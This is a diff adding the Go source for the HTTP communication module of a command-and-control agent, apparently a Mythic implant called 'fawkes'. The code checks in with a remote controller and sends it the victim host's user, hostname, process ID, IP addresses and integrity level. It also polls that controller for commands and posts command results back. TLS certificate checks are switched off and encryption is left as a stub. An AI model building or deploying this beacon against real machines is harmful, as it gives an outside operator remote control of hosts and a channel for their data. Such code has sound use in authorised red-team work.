@@ -1,0 +1,252 @@
+package http
+
+import (
+	"bytes"
+	"crypto/tls"
+	"encoding/json"
+	"fmt"
+	"io"
+	"log"
+	"net/http"
+	"time"
+
+	"fawkes/pkg/structs"
+)
+
+// HTTPProfile handles HTTP communication with Mythic
+type HTTPProfile struct {
+	BaseURL       string
+	UserAgent     string
+	EncryptionKey string
+	MaxRetries    int
+	SleepInterval int
+	Jitter        int
+	Debug         bool
+	client        *http.Client
+}
+
+// NewHTTPProfile creates a new HTTP profile
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool) *HTTPProfile {
+	profile := &HTTPProfile{
+		BaseURL:       baseURL,
+		UserAgent:     userAgent,
+		EncryptionKey: encryptionKey,
+		MaxRetries:    maxRetries,
+		SleepInterval: sleepInterval,
+		Jitter:        jitter,
+		Debug:         debug,
+	}
+
+	// Create HTTP client with reasonable defaults
+	profile.client = &http.Client{
+		Timeout: 30 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{
+				InsecureSkipVerify: true, // For testing - should be configurable
+			},
+		},
+	}
+
+	return profile
+}
+
+// Checkin performs the initial checkin with Mythic
+func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
+	checkinMsg := structs.CheckinMessage{
+		Action:       "checkin",
+		PayloadUUID:  agent.PayloadUUID,
+		User:         agent.User,
+		Host:         agent.Host,
+		PID:          agent.PID,
+		OS:           agent.OS,
+		Architecture: agent.Architecture,
+		Domain:       agent.Domain,
+		InternalIP:   agent.InternalIP,
+		ExternalIP:   agent.ExternalIP,
+		ProcessName:  agent.ProcessName,
+		Integrity:    agent.Integrity,
+	}
+
+	if h.Debug {
+		log.Printf("[DEBUG] Checkin message: %+v", checkinMsg)
+	}
+
+	body, err := json.Marshal(checkinMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal checkin message: %w", err)
+	}
+
+	// Encrypt if encryption key is provided
+	if h.EncryptionKey != "" {
+		// TODO: Implement encryption
+		if h.Debug {
+			log.Printf("[DEBUG] Encryption not implemented yet")
+		}
+	}
+
+	// Send checkin request
+	resp, err := h.makeRequest("POST", "/", body)
+	if err != nil {
+		return fmt.Errorf("checkin request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
+	}
+
+	if h.Debug {
+		respBody, _ := io.ReadAll(resp.Body)
+		log.Printf("[DEBUG] Checkin response: %s", string(respBody))
+	}
+
+	return nil
+}
+
+// GetTasking retrieves tasks from Mythic
+func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
+	taskingMsg := structs.TaskingMessage{
+		Action:      "get_tasking",
+		TaskingSize: 1, // Request one task at a time for now
+	}
+
+	body, err := json.Marshal(taskingMsg)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal tasking message: %w", err)
+	}
+
+	// Encrypt if encryption key is provided
+	if h.EncryptionKey != "" {
+		// TODO: Implement encryption
+		if h.Debug {
+			log.Printf("[DEBUG] Encryption not implemented yet")
+		}
+	}
+
+	resp, err := h.makeRequest("POST", "/", body)
+	if err != nil {
+		return nil, fmt.Errorf("get tasking request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
+	}
+
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read response body: %w", err)
+	}
+
+	// Decrypt if encryption key is provided
+	if h.EncryptionKey != "" {
+		// TODO: Implement decryption
+	}
+
+	if h.Debug {
+		log.Printf("[DEBUG] Tasking response: %s", string(respBody))
+	}
+
+	// Parse the response - Mythic returns different formats
+	// For now, assume it returns a JSON array of tasks
+	var taskResponse map[string]interface{}
+	if err := json.Unmarshal(respBody, &taskResponse); err != nil {
+		// If not JSON, might be no tasks
+		if h.Debug {
+			log.Printf("[DEBUG] No JSON response, assuming no tasks")
+		}
+		return []structs.Task{}, nil
+	}
+
+	// Extract tasks from response
+	var tasks []structs.Task
+	if taskList, exists := taskResponse["tasks"]; exists {
+		if taskArray, ok := taskList.([]interface{}); ok {
+			for _, taskData := range taskArray {
+				if taskMap, ok := taskData.(map[string]interface{}); ok {
+					task := structs.Task{
+						ID:      getString(taskMap, "id"),
+						Command: getString(taskMap, "command"),
+						Params:  getString(taskMap, "parameters"),
+					}
+					tasks = append(tasks, task)
+				}
+			}
+		}
+	}
+
+	return tasks, nil
+}
+
+// PostResponse sends a response back to Mythic
+func (h *HTTPProfile) PostResponse(response structs.Response) error {
+	responseMsg := structs.PostResponseMessage{
+		Action:    "post_response",
+		Responses: []structs.Response{response},
+	}
+
+	body, err := json.Marshal(responseMsg)
+	if err != nil {
+		return fmt.Errorf("failed to marshal response message: %w", err)
+	}
+
+	// Encrypt if encryption key is provided
+	if h.EncryptionKey != "" {
+		// TODO: Implement encryption
+		if h.Debug {
+			log.Printf("[DEBUG] Encryption not implemented yet")
+		}
+	}
+
+	resp, err := h.makeRequest("POST", "/", body)
+	if err != nil {
+		return fmt.Errorf("post response request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("post response failed with status: %d", resp.StatusCode)
+	}
+
+	if h.Debug {
+		respBody, _ := io.ReadAll(resp.Body)
+		log.Printf("[DEBUG] Post response result: %s", string(respBody))
+	}
+
+	return nil
+}
+
+// makeRequest is a helper function to make HTTP requests
+func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
+	url := h.BaseURL + path
+
+	var reqBody io.Reader
+	if body != nil {
+		reqBody = bytes.NewReader(body)
+	}
+
+	req, err := http.NewRequest(method, url, reqBody)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create request: %w", err)
+	}
+
+	// Set headers
+	req.Header.Set("User-Agent", h.UserAgent)
+	req.Header.Set("Content-Type", "application/json")
+
+	if h.Debug {
+		log.Printf("[DEBUG] Making %s request to %s", method, url)
+	}
+
+	return h.client.Do(req)
+}
+
+// getString safely gets a string value from a map
+func getString(m map[string]interface{}, key string) string {
+	if val, exists := m[key]; exists {
+		if str, ok := val.(string); ok {
+			return str
+		}
+	}
+	return ""
+}
